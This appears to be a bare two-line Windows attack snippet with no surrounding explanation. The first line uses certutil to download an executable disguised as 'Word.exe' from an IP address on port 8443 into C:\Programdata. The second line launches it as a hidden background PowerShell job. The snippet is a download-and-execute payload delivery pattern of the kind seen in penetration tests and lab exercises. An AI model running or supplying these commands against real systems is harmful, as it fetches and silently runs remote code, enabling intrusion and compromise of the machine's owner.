certutil -urlcache -split -f http://10.11.3.193:8443/Word.exe C:\Programdata\Word.exe
Start-Job -ScriptBlock { Start-Process -FilePath "C:\Programdata\Word.exe" -Wait -WindowStyle Hidden }
